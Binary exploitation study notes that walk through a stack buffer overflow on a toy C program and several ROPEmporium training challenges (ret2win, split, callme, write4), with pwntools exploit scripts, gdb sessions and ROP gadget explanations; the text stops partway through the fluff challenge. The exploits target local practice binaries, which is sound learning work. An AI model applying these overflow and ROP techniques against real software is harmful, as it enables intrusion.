# Binary Exploitation Notes

## Stack

The stack is a region of memory used by programs for temporary storage of data, such as local variables, function return addresses, and function parameters. It is a fundamental part of how a program operates, especially during function execution.

## Buffer Overflow

When working on a challenge involving a 32-bit binary where the buffer size is **static**, like:

```c
char buf[64];
```

Using a function that does not check input size — e.g. **gets()**, **strcpy()** — can lead to a stack overflow. Example code:

```c
#include <stdio.h>

void win(){
    puts("You won");
}

void vuln(){
    char buf[64];
    puts("Hello, try to overflow me");
    gets(buf);
}

void main(){
    vuln();
}
```

Through the **gets()** function, which is not safe — see:

```bash
man gets
```

Inputting more characters than the buffer can hold may lead to a segmentation fault or even a change in the program's control flow. By opening the program in a decompiler such as **gdb**, we can find the addresses of functions and other symbols:

```assembly
0x08049186  win
0x080491b1  vuln
0x080491ea  main
```

Knowing the above, we need to find the exact offset at which we can manipulate the instruction pointer register (eip), whose value will be changed to achieve code redirection:

```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef➤  run

Hello, try to overflow me
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
```

We can see that we successfully crashed the program. Now we just need to find the offset:

```
gef➤  pattern search $eip
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 76 (little-endian search) likely
```

So we write a Python script to perform the exploit:

```python
from pwn import *
p = process("./vuln")
win = p32(0x08049186)
offset = 76
payload = offset * b"a" + win
p.sendline(payload)
p.interactive()
```

Running it produces the final result:

```
Hello, try to overflow me
You won
[*] Got EOF while reading in interactive
```

Similarly, in a 64-bit binary we would look at the stack pointer and find the offset using rsp.

---

## Movaps

### ret2win

Sometimes the exploit may not work correctly depending on the architecture. A common issue is **movaps**, which requires the stack to be 16-byte aligned. When it is not, the program crashes and we get undefined behavior. As an example, consider ret2win from ROPEmporium. First, we gather information about the binary using **file** and **checksec**:

```
file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

```bash
checksec ret2win
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

So we have a 64-bit executable with no protections that need to be bypassed. First we run the program:

```
./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
```

So it's a Buffer Overflow — we proceed as before. We find the offset and write the exploit:

```python
from pwn import *

def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    return b"a" * offset + win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
p.sendafter(b"> ", pwn())
p.interactive()
```

Running it gives us:

```
Thank you!
Well done! Here's your flag:
[*] Got EOF while reading in interactive
Process stopped with exit code -11 (SIGSEGV) (pid 15426)
```

Without getting the flag. We also notice a segmentation fault. We attach gdb to inspect what is happening after the jump to the function, in order to check the value of the rsp register. The Python code becomes:

```python
from pwn import *

def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    return b"a" * offset + win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
gdb.attach(p, gdbscript='''
    break *0x400769
    c
    info registers $rsp
''')
p.sendafter(b"> ", pwn())
p.interactive()
```

The breakpoint in gdb is placed exactly where `system("/bin/cat flag.txt")` is called. Once the child process runs, gdb gives us:

```assembly
rsp            0x7ffc15cd3308      0x7ffc15cd3308
```

We check the value using Python:

```python
>>> 0x7ffdeb4c3408 % 16
8
```

And we see the stack is not aligned. So we will use a **ret gadget** to ensure the stack is properly aligned:

```python
def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    ret = p64(0x0000000040053e)
    return b"a" * offset + ret + win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
gdb.attach(p, gdbscript='''
    break *0x400769
    c
    info registers $rsp
''')
p.sendafter(b"> ", pwn())
p.interactive
```

```assembly
rsp            0x7ffe8776e350      0x7ffe8776e350
```

We check the value using Python:

```python
>>> 0x7ffe8776e350 % 16
0
```

The stack is now aligned. We can run it without gdb:

```
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process stopped with exit code 0 (pid 16749)
```

---

## Return Oriented Programming

### split

Return Oriented Programming works by chaining together small assembly snippets called **gadgets**, enabling our exploit to perform more complex operations. As an example, consider split from ROPEmporium:

```
NX:         NX enabled
```

We observe that the stack is NON-EXECUTABLE, so we cannot inject shellcode. We will use ROP. Decompiling with IDA, we find an interesting function:

```c
int usefulFunction()
{
  return system("/bin/ls");
}
```

However, this only lets us list directory contents. We want arbitrary read, so we need to call system with a different argument. As hinted, we search the binary for a useful string. Using IDA, we find in the .data segment:

```assembly
.data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
```

All that remains is to build the ROP chain (the ret gadget is used for stack alignment):

```python
from pwn import *

system = p64(0x400560)
pop_rdi_ret = p64(0x4007c3)
useful_string = p64(0x601060)
offset = 40
ret_gadget = p64(0x40053e)

payload = offset * b"a" + ret_gadget + pop_rdi_ret + useful_string + system

p = process("./split")
p.sendlineafter(b"> ", payload)
p.interactive()
```

```
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

---

### callme

Similarly, in callme from ROPEmporium, you need to build a ROP chain that calls 3 functions, each with 3 arguments, in sequence. You find the offset and construct the chain based on the available gadgets in the binary.

Fortunately, we found a `pop rdi; ret;` gadget to pass the first argument to each function, and a `pop rsi; pop rdx; ret;` to pass the next two — see **[Calling Conventions](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame)**.

```python
from pwn import *

elf = ELF("./callme")

call1 = p64(elf.symbols["callme_one"])
call2 = p64(elf.symbols["callme_two"])
call3 = p64(elf.symbols["callme_three"])

pop_rdi_ret = p64(0x4009a3)
pop_rsi_rdx_ret = p64(0x40093d)

ret = p64(0x4006be)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

offset = 40

p = process("./callme")

payload = b"A" * offset
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call1
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call2
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call3

p.sendline(payload)
p.interactive()
```

```
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

---

### write4

In this ROPEmporium challenge, there is no string stored at a known memory address. However, we can see a useful gadget:

```assembly
usefulGadgets proc near
mov     [r14], r15
retn
usefulGadgets endp
```

We can use it to write the contents of r15 into the address pointed to by r14. This allows us to perform an arbitrary write into a writable section of the binary, such as .bss. We also use the following gadgets:

```assembly
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400693 : pop rdi ; ret
```

The first sets values for the general-purpose registers r14 and r15, and the second lets us call `print_file` with the address where we wrote the filename `flag.txt` as its argument. The solver is as follows:

```python
from pwn import *

context.log_level = "critical"
elf = ELF("./write4")

mov_r14_r15 = p64(elf.symbols["usefulGadgets"])
print_file = p64(elf.symbols["print_file"])

ret = p64(0x4004e6)
pop_r14_r15_ret = p64(0x400690)
pop_rdi_ret = p64(0x400693)

bss = p64(elf.bss())
cat_flag = b"flag.txt"

offset = 40

payload = offset * b"a" + pop_r14_r15_ret + bss + cat_flag
payload += mov_r14_r15 + ret
payload += pop_rdi_ret + bss + print_file

p = process("./write4")

gdb.attach(p, gdbscript='''
    break *0x400690
    c
''')

p.sendline(payload)
p.interactive()
```

```
Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
$ 
```

---

### Fluff

Fluff is a ROPEmporium challenge similar to write4, but with more limited and obscure gadgets available:

```assembly
   0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:	ret    
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:	ret    
   0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:	ret    
   0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
```

To be able to use them, we need to understand what each one does.

#### Bextr

The **bextr** instruction is a bit manipulation instruction used to extract a block of bits from a source operand. It is useful when we want to retrieve specific bits from a number.

To use it, we define two things:

- The starting bit position (start)
- The number of bits to extract beginning from start (len)

```assembly
bextr destination, source, start, length
```

#### Stos

The **stos** instruction stores 1, 2, 4, or 8 bytes at a time, filling the address pointed to by rdi — i.e. `[rdi]` — with the value of al, ax, eax, or rax respectively. In addition, the rdi address is incremented by 1 after each store, so that writing occurs into consecutive memory locations.

```assembly
stos   BYTE PTR es:[rdi],al
```

#### Xlat

The **xlat** instruction moves into al the byte located at the memory address in the data segment computed as the sum of **bx** and **al**. In this case we work with **rbx**, where:

```c
al = *(rbx + al)
```
